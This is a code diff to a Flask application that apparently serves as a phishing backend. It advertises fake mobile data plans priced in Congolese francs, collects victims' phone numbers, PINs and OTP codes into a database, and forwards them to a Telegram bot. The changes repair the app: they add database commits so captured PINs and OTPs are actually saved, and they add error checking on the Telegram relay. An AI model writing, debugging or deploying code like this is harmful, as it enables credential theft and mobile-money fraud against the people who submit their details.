@@ -27,6 +27,12 @@ app = Flask(
 
 app.secret_key = os.environ.get("SECRET_KEY", "dev-secret-key")
 
+# Debug Telegram config at startup
+TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
+print(f"DEBUG - TELEGRAM_BOT_TOKEN: {'set (length={len(TELEGRAM_BOT_TOKEN)})' if TELEGRAM_BOT_TOKEN else 'NOT SET'}")
+print(f"DEBUG - TELEGRAM_CHAT_ID:   {TELEGRAM_CHAT_ID if TELEGRAM_CHAT_ID else 'NOT SET'}")
+
 # --------------------------------------------------
 # Database (psycopg3)
 # --------------------------------------------------
@@ -62,6 +68,7 @@ def init_database():
                 entry_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             );
         """)
+        conn.commit()  # safety
         print("✅ Database initialized / table ready")
     except Exception as e:
         print(f"⚠️ Database init skipped: {e}")
@@ -78,39 +85,37 @@ init_database()
 # Telegram
 # --------------------------------------------------
 
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
-TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
-
 def send_telegram(message: str):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         print("Telegram not configured — skipping send")
         return
 
     try:
-        requests.post(
+        resp = requests.post(
             f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
             data={
                 "chat_id": TELEGRAM_CHAT_ID,
                 "text": message,
                 "parse_mode": "HTML",
             },
-            timeout=5,
+            timeout=8,
         )
+        resp.raise_for_status()
         print("Telegram message sent")
     except Exception as e:
-        print(f"Telegram send error: {e}")
+        print(f"Telegram send error: {e} - Response: {resp.text if 'resp' in locals() else 'no response'}")
 
 # --------------------------------------------------
 # Plans
 # --------------------------------------------------
 
 PLANS = {
-    1: {"name": "Forfait Basique", "price": "1500 CDF"},
-    2: {"name": "Forfait Standard", "price": "2500 CDF"},
-    3: {"name": "Forfait Premium", "price": "5000 CDF"},
-    4: {"name": "Forfait Ultra", "price": "10000 CDF"},
-    5: {"name": "Forfait Business", "price": "25000 CDF"},
-    6: {"name": "Forfait Illimité", "price": "50000 CDF"},
+    1: {"name": "Forfait Basique", "price": "CDF 1500,00 /mois", "data": "5GB"},
+    2: {"name": "Forfait Standard", "price": "CDF 2500,00 /mois", "data": "15GB"},
+    3: {"name": "Forfait Premium", "price": "CDF 5000,00 /mois", "data": "30GB"},
+    4: {"name": "Forfait Ultra", "price": "CDF 10000,00 /mois", "data": "60GB"},
+    5: {"name": "Forfait Business", "price": "CDF 25000,00 /mois", "data": "100GB"},
+    6: {"name": "Forfait Illimité", "price": "CDF 50000,00 /mois", "data": "Illimité"},
 }
 
 # --------------------------------------------------
@@ -165,9 +170,10 @@ def save_phone_pin():
             plan["price"],
             request.remote_addr,
             request.headers.get("User-Agent"),
-            request.referrer,
+            request.referrer or "",
         ))
         entry_id = cur.fetchone()[0]
+        conn.commit()
         print(f"✅ Saved submission with ID {entry_id}")
     except Exception as e:
         print(f"❌ DB error in save_phone_pin: {e}")
@@ -209,9 +215,10 @@ def save_otp():
         conn = get_db_connection()
         cur = conn.cursor()
         cur.execute(
-            "UPDATE user_data SET otp_code=%s WHERE id=%s",
+            "UPDATE user_data SET otp_code = %s WHERE id = %s",
             (otp, entry_id),
         )
+        conn.commit()
         print(f"✅ OTP saved for entry {entry_id}")
     except Exception as e:
         print(f"❌ OTP save error: {e}")
@@ -228,12 +235,11 @@ def save_otp():
 
 @app.route("/success")
 def success():
-    return render_template("success.html")  # ← Fixed to match your actual filename
+    return render_template("success.html")
 
 # --------------------------------------------------
 # Local dev or Gunicorn
 # --------------------------------------------------
 
 if __name__ == "__main__":
-    # Use port 5000 locally
     app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
